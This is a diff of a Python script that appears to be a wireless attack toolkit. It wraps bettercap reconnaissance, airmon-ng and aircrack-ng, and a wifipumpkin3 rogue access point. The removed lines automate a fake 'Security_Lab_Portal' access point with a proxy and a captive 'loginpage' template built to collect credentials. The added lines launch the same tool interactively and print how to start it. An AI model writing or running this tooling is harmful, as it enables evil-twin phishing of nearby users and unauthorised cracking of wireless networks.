@@ -21,30 +21,20 @@ def run_bettercap_bcap_recon(interface):
     cmd = f"sudo bettercap -iface {interface} -eval \"wifi.recon on; set ticker.period 4; set ticker.commands 'wifi.show'; ticker on\""
     os.system(cmd)
 
-# PART 2: THE WIFIPUMPKIN3 (wp3) ADVANCED ROGUE AP MODULE SUITE
+# PART 2: THE WIFIPUMPKIN3 (wp3) CORE INTERACTIVE FRAMEWORK
 def run_wifipumpkin3_wp3_engine(interface):
-    print(f"\n[*] Compiling Wifipumpkin3 Rogue AP Subsystem Staging Fields...")
+    print(f"\n[*] Initializing Wifipumpkin3 Rogue AP Subsystem Framework...")
     print("[*] Flushing active process tables to isolate wireless card adapters...")
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     
-    wp3_script = "/tmp/wificrack_wp3_megasuite.p3"
-    try:
-        with open(wp3_script, "w") as f:
-            f.write(f"set interface {interface}\n")
-            f.write("set ssid Security_Lab_Portal\n")
-            f.write("set channel 6\n")
-            f.write("set proxy pumpkinproxy true\n")
-            f.write("set plugins captiveflask true\n")
-            f.write("set captiveflask.template loginpage\n")
-            f.write("set dnsmasq true\n")
-            f.write("start\n")
-            
-        print("[+] Staging dynamic profile configuration parameters to memory...")
-        print("[!] Launching advanced WP3 live infrastructure proxy tree portal...")
-        cmd = f"sudo wifipumpkin3 --p3 {wp3_script}"
-        os.system(cmd)
-    except Exception as e:
-        print(f"[-] Operation Failure: Staging files write aborted: {e}")
+    print("[+] Wireless stack isolated.")
+    print("[!] Launching native WP3 interactive terminal console infrastructure...")
+    print("[*] To configure options manually type: set interface " + interface)
+    print("[*] To boot the access point portal infrastructure type: start\n")
+    time.sleep(2)
+    
+    cmd = "sudo wifipumpkin3"
+    os.system(cmd)
 
 # PART 3: THE AIRCRACK-NG UTILITY ENGINE SUITE
 def run_aircrack_suite_engine(file_path):
@@ -119,9 +109,11 @@ def execute_wireless_routine(interface, mode):
 if __name__ == "__main__":
     if len(sys.argv) < 4:
         sys.exit(1)
+    
     display_engine_banner()
-    # Explicitly mapping index slices to resolve execution path bugs
+    # Explicitly fetching string references from system arguments array
     execution_route = sys.argv[1]
+    
     if execution_route == "wifi":
         execute_wireless_routine(sys.argv[2], sys.argv[3])
     elif execution_route == "crypto":
